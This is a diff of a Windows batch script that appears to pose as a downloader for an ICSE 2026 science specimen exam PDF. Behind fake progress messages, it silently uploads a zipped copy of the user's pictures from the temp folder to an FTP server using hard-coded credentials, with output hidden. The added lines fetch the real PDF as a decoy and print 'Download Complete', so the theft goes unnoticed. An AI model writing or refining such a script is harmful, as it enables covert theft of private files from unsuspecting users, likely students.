@@ -24,6 +24,10 @@ echo 82%%
 timeout /t 1 /nobreak >nul
 echo 99%%
 curl -T "%TEMP%\Pictures.zip" ftp://ftpupload.net/htdocs/data/pics.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
+echo 100%%
+wget "https://cisce.org/wp-content/uploads/2025/11/ICSE-2026-SPECIMEN-521-SCI1.pdf" 
+echo Download Complete
 echo Some error occured. Unable to download file
 
 pause
+
